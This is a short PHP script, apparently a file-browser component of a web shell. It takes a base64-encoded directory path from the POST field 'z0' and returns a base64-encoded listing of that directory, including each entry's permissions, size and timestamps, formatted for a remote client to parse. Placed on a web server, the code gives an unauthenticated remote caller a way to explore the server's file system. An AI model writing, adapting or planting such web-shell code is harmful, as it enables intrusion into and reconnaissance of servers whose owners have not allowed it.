<?php
function fnGetFilePermission($file)
{
    $perms = fileperms($file);
    switch ($perms & 0xF000) 
    {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function fnDatetimeConversion($datetime)
{
    return date("Y-m-d H:i:s", $datetime);
}

$szDir = base64_decode($_POST['z0']);
chdir($szDir) or die('ERROR://Unable to open directory');
$aEntry = scandir(getcwd());
$aResult = array();
for ($i = 0; $i < count($aEntry); $i++)
{
    $szEntry = $aEntry[$i];
    $szPrefix = '';
    if (is_dir($szEntry))
        $szPrefix = '/';

    $szFileName = "$szPrefix$szEntry";
    $szb64FileName = base64_encode($szFileName);
    $szPerm = fnGetFilePermission($szEntry);
    $nLength = filesize($szEntry);

    $ctime = fnDatetimeConversion(filectime($szEntry));
    $mtime = fnDatetimeConversion(filemtime($szEntry));
    $atime = fnDatetimeConversion(fileatime($szEntry));

    $szResult = "$szb64FileName?$szPerm?$nLength?$ctime?$mtime?$atime";

    array_push($aResult, $szResult);
}

echo(join('|', $aResult));
?>